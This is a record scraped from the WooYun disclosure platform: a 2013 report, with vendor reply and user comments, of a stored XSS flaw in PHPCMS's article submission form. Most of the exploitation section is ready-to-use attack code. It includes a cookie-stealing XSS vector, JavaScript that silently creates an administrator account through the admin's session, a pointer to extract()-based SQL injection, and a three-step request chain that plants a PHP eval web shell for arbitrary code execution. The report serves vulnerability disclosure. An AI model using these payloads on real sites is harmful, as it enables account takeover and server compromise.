{"id": 5413, "wybug_id": "wooyun-2013-046325", "wybug_title": "PHPCMS最新版存储型xss（附多种利用方法）", "wybug_corp": "phpcms", "wybug_author": "felixk3y", "wybug_date": "2013-12-18 12:03", "wybug_open_date": "2014-03-18 12:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-18：\t细节向公众公开  简要描述： 我想说的是难道还有什么比让人帮忙做事,自己翘着二郎腿 坐等结果更爽的事吗?哼哼哼... 详细说明：  PHPCMS文章投稿处存在存储型的XSS漏洞,也许当你看到标题的时候,你心里会想：楼主简直太不厚道了,不就一个XSS嘛,标题却来个代码执行...别慌,一个漏洞所造成的威胁,本人觉得并不在于其本身,而在于我们如何将其利用,使之最大化, So...听我细细道来...#1 首先说下这个漏洞的产生/phpcms/modules/member/content.php 61行左右\n<?$info = array();foreach($_POST['info'] as $_k=>$_v){\tif(in_array($_k, $fields)) $info[$_k] = new_html_special_chars(trim_script($_v));}$_POST['linkurl'] = str_replace(array('\"','(',')',\",\",' '),'',new_html_special_chars($_POST['linkurl']));//exit($_POST['linkurl']);//上面一行仅简单过滤了\"、(、)等,SO可以轻松绕过$post_fields = array_keys($_POST['info']);?>\n对应的前台：\n\n#2 简单利用之一获取管理员COOKIE投稿一篇 写入利用代码：\nJavascript:%28alert%28document.cookie%29%29\n前台效果展示：\n\n管理后台效果展示：\n\n   漏洞证明：  #3 简单利用之二添加任意管理员账号这个我具体没去测试,不过应该可行，给出利用代码(js)：将下面的代码保存为js：\nif(top.window.location.href.indexOf(\"pc_hash=\")>0){   var hash = top.window.location.href.substr(top.window.location.href.indexOf(\"pc_hash=\")+8,6); } var xmlHttp = null; var cookie = document.cookie; var url = \"index.php?m=admin&c=admin_manage&a=add\"; var urldata = \"info%5Busername%5D=test&info%5Bpassword%5D=123456&info%5Bpwdconfirm%5D=123456&info%5Bemail%5D=felixk3y%40qq.com&info%5Brealname%5D=aaa&info%5Broleid%5D=1&dosubmit=%E6%8F%90%E4%BA%A4&pc_hash=\"+hash;if(window.ActiveXObject){     xmlHttp=new ActiveXObject(\"Microsoft.XMLHTTP\");}else if(window.XMLHttpRequest){     xmlHttp=new XMLHttpRequest();} if(xmlHttp!=null){    xmlHttp.onreadystatechange=state_Change;    xmlHttp.open(\"POST\",url,false);    xmlHttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded;charset=UTF-8\");    xmlHttp.setRequestHeader(\"Cookie\",cookie);    xmlHttp.send(urldata);//不为null时,必须设置Content-Type}function state_Change(){  if(xmlHttp.readyState==4)  {      if (xmlHttp.status==200)       {         //alert(xmlHttp.responseText);      }   }}\n#4 深入利用利用之SQL注入话说XSS的危害没有SQL注入严重，好吧 我承认.但是由于PHPCMS的后台变量覆盖满天飞,利用变量覆盖造成的SQL注入不是一处两处,利用XSS,我们同样可以让管理员帮我们进行注入,下面随便挑一处进行说明：/phpcms/modules/admin/log.php 第51行左右<?//...public function search_log() { \t$where = '';\textract($_GET['search']); //extract导致变量覆盖,覆盖下面的$where可进行注入\tif($username){\t\t$where .= $where ?  \" AND username='$username'\" : \" username='$username'\";\t}\tif($module){\t\t$where .= $where ?  \" AND module='$module'\" : \" module='$module'\";\t}\tif($start_time && $end_time) {\t\t$start = $start_time;\t\t$end = $end_time;\t\t$where .= \"AND `time` >= '$start' AND `time` <= '$end' \";//...?>至于具体利用嘛,可通过js的XMLHttpRequest ,具体就不多说了,都懂的...#5 深入利用之任意代码执行,GETSHELL在XSS处插入Getshell的JavaScript代码,js大至代码如下(js不熟悉,只能写个大概,别见笑)：详细的过程可以参考：http://bbs.blackbap.org/thread-4568-1-1.html这里只是通过XMLHttpRequest去实现罢了,So...获取pc_hash:\nif(top.window.location.href.indexOf(\"pc_hash\")>0){\tvar hash = top.window.location.href.substr(top.window.location.href.indexOf(\"pc_hash=\")+8,6); }\nxmlhttp 第一步：POST /phpcms/index.php?m=admin&c=urlrule&a=addpost参数：\ndosubmit=+%CC%E1%BD%BB+&pc_hash=Wq87o4&info%5Bfile%5D=category&info%5Bmodule%5D=content&info%5Bishtml%5D=1&info%5Bexample%5D=shell&info%5Burlrule%5D=shell.php&f1=%7B%24categorydir%7D&f1=%7B%24catdir%7D&f1=%7B%24year%7D&f1=%7B%24month%7D&f1=%7B%24day%7D&f1=%7B%24id%7D&f1=%7B%24page%7D\nxmlhttp 第二步：POST /phpcms/index.php?m=admin&c=category&a=addpost参数：\naddtype=0&info%5Bmodelid%5D=1&info%5Bparentid%5D=0&info%5Bcatname%5D=%3C%3Fphp+%40eval%28%24_POST%5B1%5D%29%3F%3E&batch_add=&info%5Bcatdir%5D=shell&info%5Bimage%5D=&info%5Bdescription%5D=&setting%5Bworkflowid%5D=&info%5Bismenu%5D=1&setting%5Bishtml%5D=1&setting%5Bcontent_ishtml%5D=0&category_php_ruleid=6&category_html_ruleid=33&show_php_ruleid=16&show_html_ruleid=11&setting%5Bcreate_to_html_root%5D=0&info%5Burl%5D=&setting%5Btemplate_list%5D=default&setting%5Bcategory_template%5D=category&setting%5Blist_template%5D=list&setting%5Bshow_template%5D=show&setting%5Bmeta_title%5D=&setting%5Bmeta_keywords%5D=&setting%5Bmeta_description%5D=&setting%5Bpresentpoint%5D=1&setting%5Bdefaultchargepoint%5D=0&setting%5Bpaytype%5D=0&setting%5Brepeatchargedays%5D=1&catid=&dosubmit=%CC%E1%BD%BB&pc_hash=Wq87o4\nxmlhttp 第三步：POST /phpcms/index.php?m=content&c=create_html&a=categorypost参数：pc_hash=Wq87o4&dosubmit=1&type=all&modelid=&catids%5B%5D=0&pagesize=10下面给出个xmlhttp发送post包大致代码如下：\nvar postdata = \"postdata\"xmlhttp.open(\"POST\", url, true); xmlhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");xmlhttp.setRequestHeader(\"Content-length\", postdata.length);xmlhttp.setRequestHeader(\"Connection\", \"close\");xmlhttp.send(paramss);\n此时会在html文件夹下生成shell.php，不过此时\"<\"会被转义。\n\n这时候，重复2 3步骤,即可getshell ,执行任意代码SHELL Link: http://url/html/shell.php\n\n   修复方案：  你们比我懂...   版权声明：转载请注明来源 felixk3y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-18 17:24 厂商回复： 感谢反馈！！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-18 12:04 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  mark!前排火速留名    \n     2014-01-08 11:36 |    \t\tbig、face \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:36        | |上天请赐我一个洞|想要一件乌云衣服|)\t\t \n  学习学习    \n     2014-01-08 20:30 |    \t\t野驴~ \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 充满强烈好奇心的菜鸟。)\t\t \n  前排留名，此洞必火    \n     2014-03-18 14:09 |    \t\tSeven.Sea \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:24        | 唯有安全与美食不可辜负。)\t\t \n  mark~!    \n     2014-03-18 17:24 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  洞主这么屌，你家人知道么？    \n     2014-03-18 17:33 |    \t\t奥迪牌拖拉机 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        | 我是一个小小小小菜)\t\t \n  虔诚的学习了！~    \n     2014-03-19 08:33 |    \t\tPanFake \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 略懂略懂)\t\t \n  这个才10rank？果断应该留下！    \n     2014-06-13 11:00 |    \t\t小贱人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 资深菜鸟，)\t\t \n  已阅     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}